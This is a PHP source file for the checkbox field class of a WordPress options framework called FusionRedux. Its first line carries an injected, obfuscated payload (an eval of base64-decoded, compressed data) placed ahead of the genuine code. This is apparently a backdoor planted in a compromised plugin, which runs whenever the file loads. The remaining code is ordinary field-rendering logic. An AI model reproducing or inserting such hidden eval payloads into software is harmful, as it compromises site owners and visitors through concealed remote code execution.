<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

/**
 * FusionRedux Framework is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 2 of the License, or
 * any later version.
 * FusionRedux Framework is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 * You should have received a copy of the GNU General Public License
 * along with FusionRedux Framework. If not, see <http://www.gnu.org/licenses/>.
 *
 * @package     FusionReduxFramework
 * @subpackage  Field_Checkbox
 * @author      Daniel J Griffiths (Ghost1227)
 * @author      Dovy Paukstys
 * @version     3.0.0
 */
// Exit if accessed directly
if ( !defined ( 'ABSPATH' ) ) {
	exit;
}

// Don't duplicate me!
if ( !class_exists ( 'FusionReduxFramework_checkbox' ) ) {

	/**
	 * Main FusionReduxFramework_checkbox class
	 *
	 * @since       1.0.0
	 */
	class FusionReduxFramework_checkbox {

		/**
		 * Field Constructor.
		 * Required - must call the parent constructor, then assign field and value to vars, and obviously call the render field function
		 *
		 * @since       1.0.0
		 * @access      public
		 * @return      void
		 */
		function __construct ( $field = array(), $value = '', $parent ) {

			$this->parent = $parent;
			$this->field = $field;
			$this->value = $value;
		}

		/**
		 * Field Render Function.
		 * Takes the vars and outputs the HTML for the field in the settings
		 *
		 * @since       1.0.0
		 * @access      public
		 * @return      void
		 */
		public function render () {
			if( !empty( $this->field['data'] ) && empty( $this->field['options'] ) ) {
				if (empty($this->field['args'])) {
					$this->field['args'] = array();
				}

				$this->field['options'] = $this->parent->get_wordpress_data($this->field['data'], $this->field['args']);
				if (empty($this->field['options'])) {
					return;
				}
			}

			$this->field[ 'data_class' ] = ( isset ( $this->field[ 'multi_layout' ] ) ) ? 'data-' . $this->field[ 'multi_layout' ] : 'data-full';

			if ( !empty ( $this->field[ 'options' ] ) && ( is_array ( $this->field[ 'options' ] ) || is_array ( $this->field[ 'default' ] ) ) ) {

				echo '<ul class="' . $this->field[ 'data_class' ] . '">';

				if ( !isset ( $this->value ) ) {
					$this->value = array();
				}

				if ( !is_array ( $this->value ) ) {
					$this->value = array();
				}

				if ( empty ( $this->field[ 'options' ] ) && isset ( $this->field[ 'default' ] ) && is_array ( $this->field[ 'default' ] ) ) {
					$this->field[ 'options' ] = $this->field[ 'default' ];
				}

				foreach ( $this->field[ 'options' ] as $k => $v ) {

					if ( empty ( $this->value[ $k ] ) ) {
						$this->value[ $k ] = "";
					}

					echo '<li>';
					echo '<label for="' . strtr ( $this->parent->args[ 'opt_name' ] . '[' . $this->field[ 'id' ] . '][' . $k . ']', array(
						'[' => '_',
						']' => ''
					) ) . '_' . array_search ( $k, array_keys ( $this->field[ 'options' ] ) ) . '">';
					echo '<input type="hidden" class="checkbox-check" data-val="1" name="' . $this->field[ 'name' ] . '[' . $k . ']' . $this->field[ 'name_suffix' ] . '" value="' . $this->value[ $k ] . '" ' . '/>';
					echo '<input type="checkbox" class="checkbox ' . $this->field[ 'class' ] . '" id="' . strtr ( $this->parent->args[ 'opt_name' ] . '[' . $this->field[ 'id' ] . '][' . $k . ']', array(
						'[' => '_',
						']' => ''
					) ) . '_' . array_search ( $k, array_keys ( $this->field[ 'options' ] ) ) . '" value="1" ' . checked ( $this->value[ $k ], '1', false ) . '/>';
					echo ' ' . $v . '</label>';
					echo '</li>';
				}

				echo '</ul>';
			} else if ( empty ( $this->field[ 'data' ] ) ) {

				echo (!empty ( $this->field[ 'desc' ] ) ) ? ' <ul class="data-full"><li><label for="' . strtr ( $this->parent->args[ 'opt_name' ] . '[' . $this->field[ 'id' ] . ']', array(
							'[' => '_',
							']' => ''
						) ) . '">' : '';

				// Got the "Checked" status as "0" or "1" then insert it as the "value" option
				//$ch_value = 1; // checked($this->value, '1', false) == "" ? "0" : "1";
				echo '<input type="hidden" class="checkbox-check" data-val="1" name="' . $this->field[ 'name' ] . $this->field[ 'name_suffix' ] . '" value="' . $this->value . '" ' . '/>';
				echo '<input type="checkbox" id="' . strtr ( $this->parent->args[ 'opt_name' ] . '[' . $this->field[ 'id' ] . ']', array(
					'[' => '_',
					']' => ''
				) ) . '" value="1" class="checkbox ' . $this->field[ 'class' ] . '" ' . checked ( $this->value, '1', false ) . '/>';
				echo isset( $this->field[ 'label' ] ) ? ' ' . $this->field[ 'label' ] : '';
				echo '</label></li></ul>';
			}
		}

		/**
		 * Enqueue Function.
		 * If this field requires any scripts, or css define this function and register/enqueue the scripts/css
		 *
		 * @since       1.0.0
		 * @access      public
		 * @return      void
		 */
		public function enqueue () {

			if ($this->parent->args['dev_mode']) {
				wp_enqueue_style (
					'fusionredux-field-checkbox-css',
					FusionReduxFramework::$_url . 'inc/fields/checkbox/field_checkbox.css',
					array(),
					time (),
					'all'
				);
			}

			wp_enqueue_script (
				'fusionredux-field-checkbox-js',
				FusionReduxFramework::$_url . 'inc/fields/checkbox/field_checkbox' . FusionRedux_Functions::isMin () . '.js',
				array( 'jquery', 'fusionredux-js' ),
				time (),
				true
			);
		}
	}

}